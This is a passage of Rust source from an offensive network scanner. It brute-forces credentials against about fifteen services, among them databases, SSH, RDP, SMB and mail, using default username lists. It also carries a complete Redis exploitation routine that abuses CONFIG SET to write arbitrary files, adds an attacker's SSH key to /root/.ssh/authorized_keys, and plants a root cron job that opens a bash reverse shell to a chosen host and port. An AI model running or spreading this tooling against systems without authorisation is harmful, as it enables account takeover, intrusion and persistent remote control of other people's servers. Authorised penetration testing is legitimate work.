                ]),
            }));
        }
    }

    Ok(None)
}

fn scan_mysql(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for username in usernames_for_service("mysql", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if mysql_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "mysql".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("mysql")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_postgres(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for username in usernames_for_service("postgres", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if postgres_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "postgres".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("postgresql")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_neo4j(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if neo4j_login(target, None, None, context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "neo4j".to_string(),
            target: target.clone(),
            status: "unauthorized-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("neo4j")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("unauthorized-access")),
            ]),
        }));
    }

    if neo4j_login(target, Some("neo4j"), Some("neo4j"), context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "neo4j".to_string(),
            target: target.clone(),
            status: "default-credentials".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("neo4j")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("default-credentials")),
                ("username".to_string(), json!("neo4j")),
                ("password".to_string(), json!("neo4j")),
            ]),
        }));
    }

    for username in usernames_for_service("neo4j", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if username == "neo4j" && password == "neo4j" {
                continue;
            }
            if neo4j_login(
                target,
                Some(username.as_str()),
                Some(password.as_str()),
                context.timeout_secs,
            )? {
                return Ok(Some(PluginFinding {
                    plugin: "neo4j".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("neo4j")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_cassandra(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if cassandra_login(target, None, None, context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "cassandra".to_string(),
            target: target.clone(),
            status: "unauthorized-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("cassandra")),
                ("port".to_string(), json!(target.port)),
                ("auth_type".to_string(), json!("anonymous")),
                ("type".to_string(), json!("unauthorized-access")),
                ("description".to_string(), json!("数据库允许无认证访问")),
            ]),
        }));
    }

    for username in usernames_for_service("cassandra", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if cassandra_login(
                target,
                Some(username.as_str()),
                Some(password.as_str()),
                context.timeout_secs,
            )? {
                return Ok(Some(PluginFinding {
                    plugin: "cassandra".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("cassandra")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_redis(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    let runtime = current_redis_runtime_options();
    let response = send_tcp_command(target, b"INFO\r\n", context.timeout_secs)?;
    if response.contains("redis_version") {
        let _ = redis_run_exploit(target, None, context.timeout_secs, &runtime);
        return Ok(Some(PluginFinding {
            plugin: "redis".to_string(),
            target: target.clone(),
            status: "unauthorized".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("redis")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("unauthorized")),
            ]),
        }));
    }

    if !response.to_ascii_uppercase().contains("NOAUTH") {
        return Ok(None);
    }

    if brute_force_disabled() {
        return Ok(None);
    }

    for password in passwords_for_user(None, context) {
        let auth_command = format!("AUTH {password}\r\nINFO\r\n");
        let auth_response =
            send_tcp_command(target, auth_command.as_bytes(), context.timeout_secs)?;
        if auth_response.contains("+OK") && auth_response.contains("redis_version") {
            let _ = redis_run_exploit(
                target,
                Some(password.as_str()),
                context.timeout_secs,
                &runtime,
            );
            return Ok(Some(PluginFinding {
                plugin: "redis".to_string(),
                target: target.clone(),
                status: "weak-password".to_string(),
                details: BTreeMap::from([
                    ("service".to_string(), json!("redis")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-password")),
                    ("password".to_string(), json!(password)),
                ]),
            }));
        }
    }

    Ok(None)
}

fn redis_run_exploit(
    target: &OpenService,
    password: Option<&str>,
    timeout_secs: u64,
    options: &RedisRuntimeOptions,
) -> Result<()> {
    if options.disable_redis || !redis_exploit_requested(options) {
        return Ok(());
    }

    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    redis_auth_if_needed(&mut stream, password)?;
    let (dbfilename, dir) = redis_get_config(&mut stream)?;

    if let (Some(path), Some(content)) = (
        options.redis_write_path.as_deref(),
        options.redis_write_content.as_deref(),
    ) {
        let file = std::path::Path::new(path);
        let dir_path = file
            .parent()
            .map(|value| value.to_string_lossy().to_string())
            .unwrap_or_else(|| ".".to_string());
        let file_name = file
            .file_name()
            .map(|value| value.to_string_lossy().to_string())
            .unwrap_or_else(|| "dump.rdb".to_string());
        let _ = redis_write_custom_file(&mut stream, &dir_path, &file_name, content);
    }

    if let (Some(path), Some(source)) = (
        options.redis_write_path.as_deref(),
        options.redis_write_file.as_ref(),
    ) {
        if let Ok(content) = fs::read_to_string(source) {
            let file = std::path::Path::new(path);
            let dir_path = file
                .parent()
                .map(|value| value.to_string_lossy().to_string())
                .unwrap_or_else(|| ".".to_string());
            let file_name = file
                .file_name()
                .map(|value| value.to_string_lossy().to_string())
                .unwrap_or_else(|| "dump.rdb".to_string());
            let _ = redis_write_custom_file(&mut stream, &dir_path, &file_name, &content);
        }
    }

    if let Some(key_file) = options.redis_file.as_ref() {
        if let Ok(key) = redis_read_first_nonempty_line(key_file) {
            let _ = redis_write_public_key(&mut stream, &key);
        }
    }

    if let Some(shell) = options.redis_shell.as_deref() {
        let _ = redis_write_cron(&mut stream, shell);
    }

    let _ = redis_restore_config(&mut stream, &dbfilename, &dir);
    Ok(())
}

fn redis_exploit_requested(options: &RedisRuntimeOptions) -> bool {
    options.redis_file.is_some()
        || options.redis_shell.is_some()
        || (options.redis_write_path.is_some() && options.redis_write_content.is_some())
        || (options.redis_write_path.is_some() && options.redis_write_file.is_some())
}

fn redis_auth_if_needed(stream: &mut TcpStream, password: Option<&str>) -> Result<()> {
    if let Some(password) = password {
        let response = redis_send_command(stream, &format!("AUTH {password}\r\n"))?;
        if !response.contains("+OK") {
            anyhow::bail!("redis auth failed");
        }
    }
    Ok(())
}

fn redis_get_config(stream: &mut TcpStream) -> Result<(String, String)> {
    let dbfilename =
        redis_parse_config_value(&redis_send_command(stream, "CONFIG GET dbfilename\r\n")?)
            .context("missing redis dbfilename")?;
    let dir = redis_parse_config_value(&redis_send_command(stream, "CONFIG GET dir\r\n")?)
        .context("missing redis dir")?;
    Ok((dbfilename, dir))
}

fn redis_parse_config_value(response: &str) -> Option<String> {
    let parts = response
        .split("\r\n")
        .filter(|value| !value.is_empty())
        .collect::<Vec<_>>();
    parts.last().map(|value| (*value).to_string())
}

fn redis_write_custom_file(
    stream: &mut TcpStream,
    dir_path: &str,
    file_name: &str,
    content: &str,
) -> Result<bool> {
    let response = redis_send_command(stream, &format!("CONFIG SET dir {dir_path}\r\n"))?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, &format!("CONFIG SET dbfilename {file_name}\r\n"))?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let safe = content.replace('"', "\\\"").replace('\n', "\\n");
    let response = redis_send_command(stream, &format!("set x \"{safe}\"\r\n"))?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, "save\r\n")?;
    Ok(response.contains("OK"))
}

fn redis_write_public_key(stream: &mut TcpStream, key: &str) -> Result<bool> {
    let response = redis_send_command(stream, "CONFIG SET dir /root/.ssh/\r\n")?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, "CONFIG SET dbfilename authorized_keys\r\n")?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, &format!("set x \"\\n\\n\\n{key}\\n\\n\\n\"\r\n"))?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, "save\r\n")?;
    Ok(response.contains("OK"))
}

fn redis_write_cron(stream: &mut TcpStream, host: &str) -> Result<bool> {
    let mut response = redis_send_command(stream, "CONFIG SET dir /var/spool/cron/crontabs/\r\n")?;
    if !response.contains("OK") {
        response = redis_send_command(stream, "CONFIG SET dir /var/spool/cron/\r\n")?;
        if !response.contains("OK") {
            return Ok(false);
        }
    }
    let response = redis_send_command(stream, "CONFIG SET dbfilename root\r\n")?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let mut segments = host.split(':');
    let host = segments.next().unwrap_or_default();
    let port = segments.next().unwrap_or_default();
    if host.is_empty() || port.is_empty() {
        return Ok(false);
    }
    let cron = format!("set xx \"\\n* * * * * bash -i >& /dev/tcp/{host}/{port} 0>&1\\n\"\r\n");
    let response = redis_send_command(stream, &cron)?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, "save\r\n")?;
    Ok(response.contains("OK"))
}

fn redis_restore_config(stream: &mut TcpStream, dbfilename: &str, dir: &str) -> Result<()> {
    let _ = redis_send_command(stream, &format!("CONFIG SET dbfilename {dbfilename}\r\n"))?;
    let _ = redis_send_command(stream, &format!("CONFIG SET dir {dir}\r\n"))?;
    Ok(())
}

fn redis_read_first_nonempty_line(path: &std::path::Path) -> Result<String> {
    let content = fs::read_to_string(path)
        .with_context(|| format!("failed to read redis file {}", path.display()))?;
    content
        .lines()
        .map(str::trim)
        .find(|line| !line.is_empty())
        .map(ToString::to_string)
        .context("redis file is empty")
}

fn redis_send_command(stream: &mut TcpStream, command: &str) -> Result<String> {
    write_and_flush(stream, command.as_bytes())?;
    read_available(stream)
}

fn scan_memcached(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    let response = send_tcp_command(target, b"stats\r\n", context.timeout_secs)?;
    if response.contains("STAT ") {
        return Ok(Some(PluginFinding {
            plugin: "memcached".to_string(),
            target: target.clone(),
            status: "unauthorized-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("memcached")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("unauthorized-access")),
                ("stats".to_string(), json!(response)),
            ]),
        }));
    }
    Ok(None)
}

fn scan_elasticsearch(
    target: &OpenService,
    context: &PluginContext,
) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(context.timeout_secs.max(1)))
        .build()
        .context("failed to build elasticsearch client")?;

    for scheme in ["http", "https"] {
        let base = format!("{scheme}://{}:{}", target.host, target.port);
        let unauth = client.get(format!("{base}/_cat/indices")).send();
        if let Ok(response) = unauth {
            if response.status().is_success() {
                return Ok(Some(PluginFinding {
                    plugin: "elasticsearch".to_string(),
                    target: target.clone(),
                    status: "unauthorized".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("elasticsearch")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("unauthorized")),
                        ("scheme".to_string(), json!(scheme)),
                    ]),
                }));
            }
        }

        for username in usernames_for_service("elasticsearch", context) {
            for password in passwords_for_user(Some(username.as_str()), context) {
                let auth = base64::engine::general_purpose::STANDARD
                    .encode(format!("{username}:{password}"));
                let response = client
                    .get(format!("{base}/_cat/indices"))
                    .header(reqwest::header::AUTHORIZATION, format!("Basic {auth}"))
                    .send();
                if let Ok(response) = response {
                    if response.status().is_success() {
                        return Ok(Some(PluginFinding {
                            plugin: "elasticsearch".to_string(),
                            target: target.clone(),
                            status: "weak-password".to_string(),
                            details: BTreeMap::from([
                                ("service".to_string(), json!("elasticsearch")),
                                ("port".to_string(), json!(target.port)),
                                ("type".to_string(), json!("weak-password")),
                                ("scheme".to_string(), json!(scheme)),
                                ("username".to_string(), json!(username)),
                                ("password".to_string(), json!(password)),
                            ]),
                        }));
                    }
                }
            }
        }
    }

    Ok(None)
}

fn default_usernames(service: &str) -> &'static [&'static str] {
    match service {
        "ftp" => &[
            "ftp", "admin", "www", "web", "root", "db", "wwwroot", "data",
        ],
        "smb" => &["administrator", "admin", "guest"],
        "smb2" => &["administrator", "admin", "guest"],
        "ssh" => &["root", "admin"],
        "telnet" => &["root", "admin", "test"],
        "rdp" => &["administrator", "admin", "guest"],
        "smtp" => &[
            "admin",
            "root",
            "postmaster",
            "mail",
            "smtp",
            "administrator",
        ],
        "imap" => &["admin", "mail", "postmaster", "root", "user", "test"],
        "pop3" => &["admin", "root", "mail", "user", "test", "postmaster"],
        "activemq" => &["admin", "root", "activemq", "system", "user"],
        "rsync" => &["rsync", "root", "admin", "backup"],
        "rabbitmq" => &[
            "guest",
            "admin",
            "administrator",
            "rabbit",
            "rabbitmq",
            "root",
        ],
        "ldap" => &[
            "admin",
            "administrator",
            "root",
            "cn=admin",
            "cn=administrator",
            "cn=manager",
        ],
        "kafka" => &["admin", "kafka", "root", "test"],
        "mssql" => &["sa", "sql"],
        "oracle" => &["sys", "system", "admin", "test", "web", "orcl"],
        "mysql" => &["root", "mysql"],
        "postgres" => &["postgres", "admin"],
        "neo4j" => &["neo4j", "admin", "root", "test"],
        "cassandra" => &["cassandra", "admin", "root", "system"],
        "elasticsearch" => &["elastic", "admin", "kibana"],
        _ => &[],
    }
}

fn usernames_for_service(service: &str, context: &PluginContext) -> Vec<String> {
    let mut usernames = if context.usernames.is_empty() {
        default_usernames(service)
            .iter()
            .map(|value| (*value).to_string())
            .collect()
    } else {
        context.usernames.clone()
    };
    for username in current_auth_runtime_options().extra_usernames {
        if !usernames.iter().any(|existing| existing == &username) {
            usernames.push(username);
        }
    }
    usernames
}

fn passwords_for_user(username: Option<&str>, context: &PluginContext) -> Vec<String> {
    let mut seeds: Vec<String> = if context.passwords.is_empty() {
        DEFAULT_PASSWORDS
            .iter()
            .map(|value| (*value).to_string())
            .collect()
    } else {
        context.passwords.clone()
    };
    for password in current_auth_runtime_options().extra_passwords {
        if !seeds.iter().any(|existing| existing == &password) {
            seeds.push(password);
        }
    }

    let mut expanded = Vec::new();
    for password in seeds {
        let candidate = match username {
            Some(username) => password.replace("{user}", username),
            None => password,
        };
        if !expanded.iter().any(|existing| existing == &candidate) {
            expanded.push(candidate);
        }
    }
    expanded
}

fn smb_login(
    target: &OpenService,
    username: &str,
    password: &str,
    domain: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .context("failed to build smb runtime")?;

    runtime.block_on(async {
        let client = Smb2Client::connect(Smb2ClientConfig {
            addr: format!("{}:{}", target.host, target.port),
            timeout,
            username: username.to_string(),
            password: password.to_string(),
            nt_hash: None,
            domain: domain.to_string(),
            auto_reconnect: false,
            compression: false,
            dfs_enabled: false,
            dfs_target_overrides: Default::default(),
        })
        .await;

        match client {
            Ok(_) => Ok(true),
            Err(_) => Ok(false),
        }
    })
}

fn smb2_login(
    target: &OpenService,
    username: &str,
    credential: &str,
    domain: &str,
    auth_mode: Smb2AuthMode,
    timeout_secs: u64,
) -> Result<Option<Vec<String>>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let nt_hash = match auth_mode {
        Smb2AuthMode::Password => None,
        Smb2AuthMode::Hash => Some(
            hex::decode(credential)
                .with_context(|| format!("invalid smb2 hash for user {username}"))?,
        ),
    };
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .context("failed to build smb2 runtime")?;

    runtime.block_on(async {
        let client = Smb2Client::connect(Smb2ClientConfig {
            addr: format!("{}:{}", target.host, target.port),
            timeout,
            username: username.to_string(),
            password: credential.to_string(),
            nt_hash,
            domain: domain.to_string(),
            auto_reconnect: false,
            compression: false,
            dfs_enabled: false,
            dfs_target_overrides: Default::default(),
        })
        .await;

        match client {
            Ok(mut client) => match client.list_shares().await {
                Ok(shares) => Ok(Some(
                    shares
                        .into_iter()
                        .map(|share| share.name)
                        .collect::<Vec<_>>(),
                )),
                Err(_) => Ok(Some(Vec::new())),
            },
            Err(_) => Ok(None),
        }
    })
}

fn build_smb2_finding(
    target: &OpenService,
    username: &str,
    credential: &str,
    domain: &str,
    auth_mode: Smb2AuthMode,
    shares: Vec<String>,
) -> PluginFinding {
    let mut details = BTreeMap::from([
        ("service".to_string(), json!("smb2")),
        ("port".to_string(), json!(target.port)),
        ("type".to_string(), json!("weak-auth")),
        ("username".to_string(), json!(username)),
        ("credential".to_string(), json!(credential)),
        (
            "auth_type".to_string(),
            json!(match auth_mode {
                Smb2AuthMode::Password => "password",
                Smb2AuthMode::Hash => "hash",
            }),
        ),
    ]);
    if !domain.is_empty() {
        details.insert("domain".to_string(), json!(domain));
    }
    if !shares.is_empty() {
        details.insert("shares".to_string(), json!(shares));
    }
    PluginFinding {
        plugin: "smb2".to_string(),
        target: target.clone(),
        status: "weak-auth".to_string(),
        details,
    }
}

fn rdp_login(
    target: &OpenService,
    username: &str,
    password: &str,
    domain: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let stream = connect_stream(target, timeout)?;
    stream
        .set_read_timeout(Some(timeout))
        .context("failed to set rdp read timeout")?;
    stream
        .set_write_timeout(Some(timeout))
        .context("failed to set rdp write timeout")?;

    let mut connector = RdpConnector::new().screen(800, 600).credentials(
        domain.to_string(),
        username.to_string(),
        password.to_string(),
    );

    match connector.connect(stream) {
        Ok(mut client) => {
            let _ = client.shutdown();
            Ok(true)
        }
        Err(_) => Ok(false),
    }
}

fn ssh_password_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let stream = connect_stream(target, timeout)?;
    stream
        .set_read_timeout(Some(timeout))
        .context("failed to set ssh read timeout")?;
    stream
        .set_write_timeout(Some(timeout))
        .context("failed to set ssh write timeout")?;

    let mut session = ssh2::Session::new().context("failed to create ssh session")?;
    session.set_timeout((timeout.as_millis().min(u32::MAX as u128)) as u32);
    session.set_tcp_stream(stream);
    session.handshake().context("ssh handshake failed")?;
    session
        .userauth_password(username, password)
        .context("ssh password authentication failed")?;

    if !session.authenticated() {
        return Ok(false);
    }

    let _ = session
        .channel_session()
        .context("ssh session channel open failed")?;
    Ok(true)
}

fn ssh_key_login(
    target: &OpenService,
    username: &str,
    key_path: &PathBuf,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let stream = connect_stream(target, timeout)?;
    stream
        .set_read_timeout(Some(timeout))
        .context("failed to set ssh read timeout")?;
    stream
        .set_write_timeout(Some(timeout))
        .context("failed to set ssh write timeout")?;

    let mut session = ssh2::Session::new().context("failed to create ssh session")?;
    session.set_timeout((timeout.as_millis().min(u32::MAX as u128)) as u32);
    session.set_tcp_stream(stream);
    session.handshake().context("ssh handshake failed")?;
    session
        .userauth_pubkey_file(username, None, key_path, None)
        .with_context(|| {
            format!(
                "ssh public key authentication failed for {}",
                key_path.display()
            )
        })?;

    if !session.authenticated() {
        return Ok(false);
    }

    let _ = session
        .channel_session()
        .context("ssh session channel open failed")?;
    Ok(true)
}

fn ftp_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    let _ = read_available(&mut stream)?;
    write_and_flush(&mut stream, format!("USER {username}\r\n").as_bytes())?;
    let user_response = read_available(&mut stream)?;
    let user_code = ftp_status_code(&user_response);
    if user_code == Some(230) {
        let _ = write_and_flush(&mut stream, b"QUIT\r\n");
        return Ok(true);
    }
    if user_code != Some(331) {
        return Ok(false);
    }

    write_and_flush(&mut stream, format!("PASS {password}\r\n").as_bytes())?;
    let pass_response = read_available(&mut stream)?;
    let _ = write_and_flush(&mut stream, b"QUIT\r\n");
    Ok(ftp_status_code(&pass_response) == Some(230))
}

fn ftp_status_code(response: &str) -> Option<u16> {
    response
        .lines()
        .find_map(|line| line.get(0..3).and_then(|code| code.parse::<u16>().ok()))
}

fn probe_telnet_access(target: &OpenService, timeout_secs: u64) -> Result<TelnetAccess> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    let banner = read_available(&mut stream)?;
    if looks_like_shell_prompt(&banner) && !looks_like_login_prompt(&banner) {
        Ok(TelnetAccess::NoAuth)
    } else {
        Ok(TelnetAccess::NeedsAuth)
    }
}

fn telnet_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    let mut response = read_available(&mut stream)?;

    if looks_like_shell_prompt(&response) && !looks_like_login_prompt(&response) {
        return Ok(true);
    }

    if looks_like_login_prompt(&response) {
        write_and_flush(&mut stream, format!("{username}\n").as_bytes())?;
        response = read_available(&mut stream)?;
    }

    if looks_like_password_prompt(&response) {
        write_and_flush(&mut stream, format!("{password}\n").as_bytes())?;
        response = read_available(&mut stream)?;
    }

    if contains_auth_failure(&response) {
        return Ok(false);
    }

    Ok(looks_like_shell_prompt(&response))
}

fn looks_like_login_prompt(value: &str) -> bool {
    let value = value.to_ascii_lowercase();
    value.contains("login:")
        || value.contains("username:")
        || value.contains("user name:")
        || value.contains("login as:")
}

fn looks_like_password_prompt(value: &str) -> bool {
    value.to_ascii_lowercase().contains("password:")
}

fn contains_auth_failure(value: &str) -> bool {
    let value = value.to_ascii_lowercase();
    value.contains("incorrect")
        || value.contains("failed")
        || value.contains("denied")
        || value.contains("invalid")
}

fn looks_like_shell_prompt(value: &str) -> bool {
    let trimmed = value.trim_end();
    trimmed.ends_with('#') || trimmed.ends_with('$') || trimmed.ends_with('>')
}

fn smtp_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    match connect_stream(target, timeout) {
        Ok(mut stream) => match smtp_login_with_stream(&mut stream, username, password) {
            Ok(true) => Ok(true),
            Ok(false) => Ok(false),
            Err(_) => {
                let mut tls_stream = connect_tls_stream(target, timeout)?;
                smtp_login_with_stream(&mut tls_stream, username, password)
            }
        },
        Err(_) => {
            let mut tls_stream = connect_tls_stream(target, timeout)?;
            smtp_login_with_stream(&mut tls_stream, username, password)
        }
    }
}

fn smtp_login_with_stream<S>(stream: &mut S, username: &str, password: &str) -> Result<bool>
where
    S: Read + Write,
{
    let banner = read_line_io(stream)?;
    if banner.is_empty() {
        anyhow::bail!("missing smtp banner");
    }
    if !smtp_code_is(&banner, 220) {
        return Ok(false);
    }

    write_and_flush_io(stream, b"EHLO rscan\r\n")?;
    let ehlo = read_smtp_response(stream)?;
    if !smtp_code_is(&ehlo, 250) {
        return Ok(false);
    }

    if username.is_empty() {
        write_and_flush_io(stream, b"MAIL FROM:<test@test.com>\r\n")?;
        let response = read_smtp_response(stream)?;
        let _ = write_and_flush_io(stream, b"QUIT\r\n");
        return Ok(smtp_code_is(&response, 250));
    }

    let auth_payload =
        base64::engine::general_purpose::STANDARD.encode(format!("\u{0}{username}\u{0}{password}"));
    write_and_flush_io(
        stream,
        format!("AUTH PLAIN {auth_payload}\r\n").as_bytes(),
    )?;
    let auth_response = read_smtp_response(stream)?;
    if !smtp_code_is(&auth_response, 235) {
        return Ok(false);
    }

    write_and_flush_io(stream, b"MAIL FROM:<test@test.com>\r\n")?;
    let mail_response = read_smtp_response(stream)?;
    let _ = write_and_flush_io(stream, b"QUIT\r\n");
    Ok(smtp_code_is(&mail_response, 250))
}

fn smtp_code_is(response: &str, code: u16) -> bool {
    response
        .lines()
        .last()
        .and_then(|line| line.get(0..3))
        .and_then(|prefix| prefix.parse::<u16>().ok())
        == Some(code)
}

fn read_smtp_response<S>(stream: &mut S) -> Result<String>
where
    S: Read,
{
    let mut response = String::new();
    loop {
        let line = read_line_io(stream)?;
        if line.is_empty() {
            break;
        }
        let done = line.as_bytes().get(3).copied() != Some(b'-');
        response.push_str(&line);
        if done {
            break;
        }
    }
    Ok(response)
}

fn imap_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    if let Ok(mut stream) = connect_stream(target, timeout) {
        if imap_login_with_stream(&mut stream, username, password)? {
            return Ok(true);
        }
    }

    let mut tls_stream = connect_tls_stream(target, timeout)?;
    imap_login_with_stream(&mut tls_stream, username, password)
}

fn imap_login_with_stream<S>(stream: &mut S, username: &str, password: &str) -> Result<bool>
where
    S: Read + Write,
{
    let banner = read_line_io(stream)?;
    if banner.is_empty() {
        return Ok(false);
    }

    write_and_flush_io(
        stream,
        format!("a001 LOGIN \"{username}\" \"{password}\"\r\n").as_bytes(),
    )?;

    loop {
        let line = read_line_io(stream)?;
        if line.is_empty() {
            return Ok(false);
        }
        if line.contains("a001 OK") {
            let _ = write_and_flush_io(stream, b"a002 LOGOUT\r\n");
            return Ok(true);
        }
        if line.contains("a001 NO") || line.contains("a001 BAD") {
            return Ok(false);
        }
    }
}

fn pop3_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<(bool, bool)> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    if let Ok(mut stream) = connect_stream(target, timeout) {
        if pop3_login_with_stream(&mut stream, username, password)? {
            return Ok((true, false));
        }
    }

    let mut tls_stream = connect_tls_stream(target, timeout)?;
    Ok((pop3_login_with_stream(&mut tls_stream, username, password)?, true))
}

fn pop3_login_with_stream<S>(stream: &mut S, username: &str, password: &str) -> Result<bool>
where
    S: Read + Write,
{
    let banner = read_line_io(stream)?;
    if !banner.starts_with("+OK") {
        return Ok(false);
    }

    write_and_flush_io(stream, format!("USER {username}\r\n").as_bytes())?;
    let user_response = read_line_io(stream)?;
    if !user_response.starts_with("+OK") {
        return Ok(false);
    }

    write_and_flush_io(stream, format!("PASS {password}\r\n").as_bytes())?;
    let pass_response = read_line_io(stream)?;
    let _ = write_and_flush_io(stream, b"QUIT\r\n");
    Ok(pass_response.starts_with("+OK"))
}

fn activemq_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    let frame = format!(
        "CONNECT\naccept-version:1.0,1.1,1.2\nhost:/\nlogin:{username}\npasscode:{password}\n\n\x00"
    );
    write_and_flush(&mut stream, frame.as_bytes())?;
    let response = read_available(&mut stream)?;
    Ok(response.contains("CONNECTED"))
}

fn rsync_login(
    target: &OpenService,
    username: Option<&str>,
    password: Option<&str>,
    timeout_secs: u64,
) -> Result<Option<String>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut list_stream = connect_stream(target, timeout)?;
    let greeting = read_line(&mut list_stream)?;
    if !greeting.starts_with("@RSYNCD:") {
        return Ok(None);
    }
    let version = greeting.trim().trim_start_matches("@RSYNCD:").trim();
    write_and_flush(&mut list_stream, format!("@RSYNCD: {version}\n").as_bytes())?;
    write_and_flush(&mut list_stream, b"#list\n")?;
    let module_listing = read_available(&mut list_stream)?;
    let module_name = module_listing
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with("@RSYNCD:"))
        .find_map(|line| line.split_whitespace().next())
        .map(ToOwned::to_owned);

    let Some(module_name) = module_name else {
        return Ok(None);
    };

    let mut auth_stream = connect_stream(target, timeout)?;
    let auth_greeting = read_line(&mut auth_stream)?;
    if !auth_greeting.starts_with("@RSYNCD:") {
        return Ok(None);
    }
    write_and_flush(&mut auth_stream, format!("@RSYNCD: {version}\n").as_bytes())?;
    write_and_flush(&mut auth_stream, format!("{module_name}\n").as_bytes())?;
    let auth_response = read_line(&mut auth_stream)?;
    if auth_response.contains("@RSYNCD: OK") {
        return Ok(if username.is_none() && password.is_none() {
            Some(module_name)
        } else {
            None
        });
    }
    if auth_response.contains("@RSYNCD: AUTHREQD") {
        if let (Some(username), Some(password)) = (username, password) {
            write_and_flush(
                &mut auth_stream,
                format!("{username} {password}\n").as_bytes(),
